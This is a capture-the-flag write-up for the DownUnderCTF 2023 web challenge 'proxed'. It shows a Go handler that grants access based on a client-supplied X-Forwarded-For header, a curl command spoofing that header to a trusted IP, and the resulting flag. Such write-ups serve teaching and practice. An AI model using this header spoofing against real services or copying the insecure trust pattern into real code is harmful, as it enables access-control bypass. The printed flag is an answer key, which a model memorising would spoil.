# DownUnderCTF 2023

## proxed

> Cool haxxorz only
>
>  Author: Jordan Bertasso
>
> [`proxed.tar.gz`](proxed.tar.gz)

Tags: _web_

## Solution
We are provided with a simple web application. There is only one route and the handler is implemented as follows:

```go
http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        xff := r.Header.Values("X-Forwarded-For")

        ip := strings.Split(r.RemoteAddr, ":")[0]

        if xff != nil {
                ips := strings.Split(xff[len(xff)-1], ", ")
                ip = ips[len(ips)-1]
                ip = strings.TrimSpace(ip)
        }

        if ip != "31.33.33.7" {
                message := fmt.Sprintf("untrusted IP: %s", ip)
                http.Error(w, message, http.StatusForbidden)
                return
        } else {
                w.Write([]byte(os.Getenv("FLAG")))
        }
})
```

The flag is printed, but only for the `trusted ip` 31.33.33.7. The trusted IP is read from `X-Forwarded-For` header which can be set manually. By doing so we get the flag:

```bash
$ curl http://proxed.duc.tf:30019/ -H "X-Forwarded-For: 31.33.33.7"
DUCTF{17_533m5_w3_f0rg07_70_pr0x}
```

Flag `DUCTF{17_533m5_w3_f0rg07_70_pr0x}`